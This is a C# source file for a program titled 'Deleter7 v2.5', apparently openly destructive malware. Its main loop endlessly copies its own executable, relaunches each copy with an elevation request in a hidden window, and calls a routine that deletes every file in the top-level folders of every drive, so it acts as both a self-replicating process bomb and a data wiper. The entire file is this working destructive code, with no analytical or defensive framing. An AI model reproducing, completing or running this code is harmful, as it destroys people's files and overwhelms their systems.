namespace System
{
    public static class Deleter
    {
        public const System.String Ver = "2.5";
        public const System.String Title = "Deleter7 v" + System.Deleter.Ver;
        public static System.String[] LogicalDrives = System.IO.Directory.GetLogicalDrives();
        public static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
        public static System.String ProgramName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
        public static System.UInt64 UInt64;
        public static System.String[] Messages = System.Deleter.Argument.Split('\n');
        public static System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
        public static void DeleteDir(System.String[] args)
        {
            System.Console.WriteLine(System.Deleter.Messages);
            foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
            {
                if (disk.Name != disk.VolumeLabel)
                {
                    System.Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                }
                else
                {
                    System.Console.WriteLine("Current drive is: " + disk.Name);
                }
                foreach (System.String drive in System.Deleter.LogicalDrives)
                {
                    System.String root = System.IO.Directory.GetDirectoryRoot(drive);
                    if (root == null || root == "")
                    {
                        root = "/";
                    }
                    System.String[] dirs = System.IO.Directory.GetDirectories(root);
                    foreach (System.String dir in dirs)
                    {
                        System.String[] files = System.IO.Directory.GetFiles(dir);
                        foreach (System.String file in files)
                        {
                            System.IO.File.Delete(file);
                            System.Console.WriteLine("Deleting " + file);
                        }
                    }
                }
            }
        }
        public static void Main(System.String[] args)
        {
            if (args == null || args.Length == 0)
            {
                args = System.Deleter.Messages;
            }
            System.Console.Title = System.Deleter.Title;
            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
            System.Threading.Thread.Sleep(1000);
            while (true)
            {
                System.Deleter.UInt64++;
                System.IO.File.Copy(System.Deleter.ProgramName + ".exe", System.Deleter.ProgramName + " (" + System.Deleter.UInt64 + ").exe");
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.Verb = "runas";
                p.StartInfo.FileName = System.Deleter.ProgramName
                    + " (" + System.Deleter.UInt64 + ").exe";
                p.StartInfo.Arguments = System.Deleter.Argument;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                p.Start();
                System.Deleter.DeleteDir(args);
            }
        }
    }
}